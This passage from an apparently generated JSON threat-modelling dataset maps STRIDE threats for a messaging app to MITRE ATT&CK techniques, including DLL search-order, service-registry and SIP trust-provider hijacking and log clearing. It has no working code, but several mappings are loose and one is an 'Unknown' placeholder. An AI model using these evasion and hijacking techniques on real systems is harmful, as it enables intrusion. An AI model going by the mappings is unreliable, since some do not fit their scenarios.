            "Potential Impact": "Compromise of data confidentiality and integrity, along with unauthorized control over application features.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "encryption protocol",
                "privilege escalation",
                "protocol manipulation"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\n\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--46944654-fcc1-4f63-9dad-628102376586",
                "technique_id": "T1038"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious insider exploits poorly configured access control on the server to gain administrator-level access.",
            "Assumptions": [
                {
                    "Assumption": "Access control mechanisms are not rigorously configured",
                    "Role": "Application",
                    "Condition": "Weak or misconfigured server ACLs"
                },
                {
                    "Assumption": "Insiders can access layers of control based on assigned roles",
                    "Role": "Service Provider",
                    "Condition": "Assignable administrative permissions"
                },
                {
                    "Assumption": "No proper logging and monitoring systems to detect privilege abuse",
                    "Role": "Application",
                    "Condition": "Lack of robust security monitoring"
                }
            ],
            "Potential Impact": "Unauthorized actions with severe data confidentiality, integrity, and availability implications.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access control",
                "administrative access",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the SQLite database management system to execute arbitrary code and gain elevated privileges on a device.",
            "Assumptions": [
                {
                    "Assumption": "SQLite database system has underlying vulnerabilities",
                    "Role": "Application",
                    "Condition": "Unpatched SQLite database security flaws"
                },
                {
                    "Assumption": "The attacker has access to the device to launch the exploit",
                    "Role": "Attacker",
                    "Condition": "Physical or remote device access"
                },
                {
                    "Assumption": "Security checks do not cover the detected database vulnerabilities",
                    "Role": "Application",
                    "Condition": "Insufficient security coverage"
                }
            ],
            "Potential Impact": "Elevation to higher privileges, compromising device data and operations.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "sqlite",
                "code execution",
                "database vulnerability"
            ],
            "mitre_technique": {
                "name": "Exploitation for Client Execution",
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
                "technique_id": "T1203"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "4",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake login portal mimicking the messaging application's login page to steal users' authentication credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users are not vigilant about checking the URL before logging in.",
                    "Role": "User",
                    "Condition": "Lack of awareness or rush to access the service"
                },
                {
                    "Assumption": "The attacker can register a domain similar to the legitimate one.",
                    "Role": "Attacker",
                    "Condition": "Availability of similar domain names"
                },
                {
                    "Assumption": "The attacker can set up a web server to host a fake page.",
                    "Role": "Attacker",
                    "Condition": "Access to required infrastructure"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of authentication credentials.",
            "MITRE ATT&CK Keywords": [
                "credential harvesting",
                "spoofing",
                "phishing",
                "social engineering",
                "network attack"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nAdversaries may also utilize spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured through \u201cconsent phishing\u201d into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)\n\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \u201cdevice code phishing,\u201d an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)",
                "id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
                "technique_id": "T1566.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts a user's session to gain unauthorized access to their messaging account.",
            "Assumptions": [
                {
                    "Assumption": "Users connect via untrusted networks (e.g., public Wi-Fi).",
                    "Role": "User",
                    "Condition": "Accessing sensitive data on public networks"
                },
                {
                    "Assumption": "The attacker's device is within the same network as the user.",
                    "Role": "Attacker",
                    "Condition": "Proximity to target (physical or virtual)"
                },
                {
                    "Assumption": "The attacker can employ man-in-the-middle techniques.",
                    "Role": "Attacker",
                    "Condition": "Skills in using MITM tools"
                }
            ],
            "Potential Impact": "Unauthorized access to messages and user data.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "session hijacking",
                "interception",
                "network attack"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An adversary impersonates a trusted contact to send malicious links or requests to other users.",
            "Assumptions": [
                {
                    "Assumption": "Users trust messages from known contacts without verification.",
                    "Role": "User",
                    "Condition": "Assumption of reliability based on contact identity"
                },
                {
                    "Assumption": "The adversary can compromise a legitimate account.",
                    "Role": "Attacker",
                    "Condition": "Success in account takeover"
                },
                {
                    "Assumption": "The messaging application lacks robust verification for message authenticity.",
                    "Role": "Application",
                    "Condition": "Gaps in verification mechanisms"
                }
            ],
            "Potential Impact": "Compromise of other user accounts or devices.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "impersonation",
                "phishing",
                "social media",
                "network attack"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a user's primary device and alters stored authentication credentials.",
            "Assumptions": [
                {
                    "Assumption": "The primary device is left unattended or improperly secured.",
                    "Role": "User",
                    "Condition": "Improper security practices"
                },
                {
                    "Assumption": "The attacker has physical access to the device.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity to the target"
                },
                {
                    "Assumption": "The stored data is not encrypted or protected by additional measures.",
                    "Role": "Application",
                    "Condition": "Weak data protection mechanisms"
                }
            ],
            "Potential Impact": "Compromise of user accounts and data integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "physical access",
                "credential manipulation",
                "device compromise",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the companion device's identity key during the linking process.",
            "Assumptions": [
                {
                    "Assumption": "The linking process is not sufficiently secured.",
                    "Role": "Application",
                    "Condition": "Inadequate protection during key exchange"
                },
                {
                    "Assumption": "The attacker can insert themselves into the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Successful man-in-the-middle attack"
                },
                {
                    "Assumption": "Users do not verify the authenticity of the companion device.",
                    "Role": "User",
                    "Condition": "Lack of user verification"
                }
            ],
            "Potential Impact": "Unauthorized access and data tampering on companion devices.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "mitm",
                "key exchange manipulation",
                "companion device",
                "session hijacking"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with root access modifies the messaging application's SQLite database to inject or alter messages.",
            "Assumptions": [
                {
                    "Assumption": "The device is already compromised, granting root access.",
                    "Role": "Attacker",
                    "Condition": "Pre-existing compromise or exploitation"
                },
                {
                    "Assumption": "The SQLite database is not fully encrypted or protected.",
                    "Role": "Application",
                    "Condition": "Insufficient database security"
                },
                {
                    "Assumption": "Applications do not perform integrity checks on the database.",
                    "Role": "Application",
                    "Condition": "Lack of integrity verification mechanisms"
                }
            ],
            "Potential Impact": "Message integrity compromised and potential unauthorized information disclosure.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database injection",
                "root access",
                "data manipulation",
                "database compromise"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny sending messages that they actually sent, claiming that the messaging service has been compromised.",
            "Assumptions": [
                {
                    "Assumption": "The application does not log sufficient data to prove message origination.",
                    "Role": "Application",
                    "Condition": "Lack of audit trails"
                },
                {
                    "Assumption": "Users are aware of non-repudiation weaknesses.",
                    "Role": "User",
                    "Condition": "User awareness and exploitation of the system's weaknesses"
                },
                {
                    "Assumption": "The service does not employ digital signatures for message authentication.",
                    "Role": "Application",
                    "Condition": "Absence of cryptographic signatures"
                }
            ],
            "Potential Impact": "Disputes over message content and sender identity.",
            "MITRE ATT&CK Keywords": [
                "non-repudiation",
                "message forgery",
                "audit trail",
                "digital signatures",
                "denial of activity"
            ],
            "mitre_technique": {
                "name": "SIP and Trust Provider Hijacking",
                "description": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",
                "id": "attack-pattern--543fceb5-cb92-40cb-aacf-6913d4db58bc",
                "technique_id": "T1553.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker modifies system logs to cover their tracks, making it difficult to trace malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the system logs.",
                    "Role": "Attacker",
                    "Condition": "Successful system compromise"
                },
                {
                    "Assumption": "The system does not implement WORM (Write Once Read Many) for logs.",
                    "Role": "Application",
                    "Condition": "Logs are not immutable"
                },
                {
                    "Assumption": "Security monitoring tools do not detect log tampering.",
                    "Role": "Application",
                    "Condition": "Insufficient monitoring and alerting"
                }
            ],
            "Potential Impact": "Failed attack detection and investigation.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "cover tracks",
                "forensics evasion",
                "system logs",
                "incident response"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user denies authorizing a companion device, claiming account misuse.",
            "Assumptions": [
                {
                    "Assumption": "The companion device linking process does not have strong non-repudiation controls.",
                    "Role": "Application",
                    "Condition": "Weak authorization mechanisms"
                },
                {
                    "Assumption": "There are no secondary verification measures when linking devices.",
                    "Role": "Application",
                    "Condition": "Lack of multi-factor authentication."
                },
                {
                    "Assumption": "Users are aware of the possibility to deny actions.",
                    "Role": "User",
                    "Condition": "User awareness of system flaws."
                }
            ],
            "Potential Impact": "Potential disputes and investigations over account misuse.",
            "MITRE ATT&CK Keywords": [
                "non-repudiation",
                "device linking",
                "secondary verification",
                "account misuse"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted traffic to extract metadata about communications.",
            "Assumptions": [
                {
                    "Assumption": "The application transmits metadata in plaintext.",
                    "Role": "Application",
                    "Condition": "Lack of encryption for metadata"
                },
                {
                    "Assumption": "The attacker is able to perform network sniffing.",
                    "Role": "Attacker",
                    "Condition": "Presence within the network or MITM position"
                },
                {
                    "Assumption": "Users are unaware that metadata can be sensitive.",
                    "Role": "User",
                    "Condition": "Lack of user education on metadata implications"
                }
            ],
            "Potential Impact": "Unauthorized access to communication patterns and personal data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted traffic",
                "metadata extraction",
                "network sniffing",
                "traffic analysis"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: 